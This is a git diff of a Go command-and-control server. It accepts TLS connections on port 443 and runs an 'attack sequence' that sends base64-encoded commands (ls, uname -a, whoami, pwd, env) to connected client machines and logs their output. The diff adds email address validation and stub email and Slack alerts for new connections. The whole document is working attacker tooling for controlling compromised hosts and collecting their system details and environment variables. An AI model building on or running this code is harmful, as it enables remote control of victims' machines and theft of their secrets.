@@ -6,12 +6,11 @@ import (
 	"crypto/tls"
 	"crypto/x509"
 	"encoding/base64"
-
-	// "errors"
 	"fmt"
 	"io"
 	"log"
 	"net"
+	"net/mail"
 	"os"
 	"os/exec"
 	"strings"
@@ -22,6 +21,15 @@ func handleError(err error) {
 	if err != nil {
 		log.Fatal(err)
 	}
+}
+
+func validateMailAddress(address string) bool {
+	_, err := mail.ParseAddress(address)
+	if err != nil {
+		fmt.Println("Invalid Email Address")
+		os.Exit(1)
+	}
+	return true
 }
 
 //file upl/downl functions, if needed
@@ -48,10 +56,24 @@ func downloadFile(conn *tls.Conn, path string) {
 	handleError(err)
 }
 
+func sendEmail(enable bool, address string, conn net.Conn){
+	if !enable{
+		return
+	}
+}
+
+func sendSlackMessage(enable bool, hook string, conn net.Conn){
+	if !enable{
+		return
+	}
+}
+
 func main() {
 	var cmdsToRun = []string{"ls", "uname -a", " whoami", "pwd      ", "env"}
 	arguments := os.Args
 	_ = checkFlags(arguments, len(arguments), cmdsToRun)
+	emailEN, slackEN := checkEmailSlackFlag(arguments, len(arguments))
+
 	var PORT string
 	PORT = "443"
 	cert, err := tls.LoadX509KeyPair("certs/server.pem", "certs/server.key")
@@ -69,10 +91,14 @@ func main() {
 	fmt.Println("Server Listening on port: ", PORT)
 	for {
 		conn, err := listener.Accept()
+		
 		if err != nil {
 			log.Printf("Client accept error: %s", err)
 			break
 		}
+
+		sendEmail(emailEN, arguments[3], conn) //returns if enable if false
+		sendSlackMessage(slackEN, arguments[4], conn) //returns if enable is false
 
 		defer conn.Close()
 		log.Printf("Client accepted: %s", conn.RemoteAddr())
@@ -113,6 +139,7 @@ func readFile(filePathName string) ([]string, int) {
 	return text, len(text)
 
 }
+
 func handleClient(conn net.Conn, l net.Listener, cmdsToRun []string) {
 	file, err := os.OpenFile(conn.RemoteAddr().String()+"-"+time.Now().Format(time.RFC1123)+".log", os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
 	if err != nil {
@@ -124,23 +151,37 @@ func handleClient(conn net.Conn, l net.Listener, cmdsToRun []string) {
 	runAttackSequence(conn, logger, cmdsToRun)
 	disconnectClient(conn, logger, *file)
 }
-func setReadDeadLine(conn net.Conn){
+func setReadDeadLine(conn net.Conn)  {
 	err := conn.SetReadDeadline(time.Now().Add(5 * time.Second))
-    if err != nil {
-        log.Println("SetReadDeadline failed:", err)
-        // do something else, for example create new conn
-        return
-    }
+	if err != nil {
+		log.Println("SetReadDeadline failed:", err)
+	}	
 }
 
-func setWriteDeadLine(conn net.Conn){
+func setWriteDeadLine(conn net.Conn) {
 	err := conn.SetWriteDeadline(time.Now().Add(5 * time.Second))
-    if err != nil {
-        log.Println("SetReadDeadline failed:", err)
-        // do something else, for example create new conn
-        return
-    }
+	if err != nil {
+		log.Println("SetWriteDeadline failed:", err)
+		
+	}
+}
 
+func checkEmailSlackFlag(argument []string,l int) (bool, bool) {
+	switch l {
+	case 3:
+		log.Print("No email address or Slack Hook provided")
+		return false, false
+	case 4:
+		log.Print("Email address provided or Slack Hook not provided")
+		validateMailAddress(argument[3])
+		return true, false
+	case 5:
+		log.Print("Both email address and Slack Hook provided")
+		return true, true
+	default:
+		log.Print("Defaulting, no email address or Slack Hook provided")
+		return false, false
+	}
 }
 func checkFlags(arguments []string, l int, cmdsToRun []string) bool {
 	switch arguments[1] {
@@ -164,7 +205,7 @@ func checkFlags(arguments []string, l int, cmdsToRun []string) bool {
 	//***************************************************//
 	// case "-fue" yet to be implemented//
 	//***************************************************//
-	case "-fue": 
+	case "-fue":
 		if l != 3 {
 			fmt.Println("No filename specified.")
 			os.Exit(1)
@@ -192,13 +233,18 @@ func runAttackSequence(conn net.Conn, logger *log.Logger, cmdsToRun []string) {
 	for _, element := range cmdsToRun {
 		element = strings.TrimSpace(element)
 		encodedStr := base64.StdEncoding.EncodeToString([]byte(element))
-		logger.Println("EXECUTE: "+ element)
+		logger.Println("EXECUTE: " + element)
 		setWriteDeadLine(conn)
 		_, err := conn.Write([]byte(encodedStr))
-		handleError(err)
-		time.Sleep(time.Second*2)
+		if err != nil {
+			return
+		}
+		time.Sleep(time.Second * 2)
 		setReadDeadLine(conn)
 		_, err = conn.Read(buffer)
+		if err != nil {
+			return
+		}
 		decodedStr, _ := base64.StdEncoding.DecodeString(string(buffer[:]))
 		logger.Println("RES: " + string(decodedStr[:]))
 	}
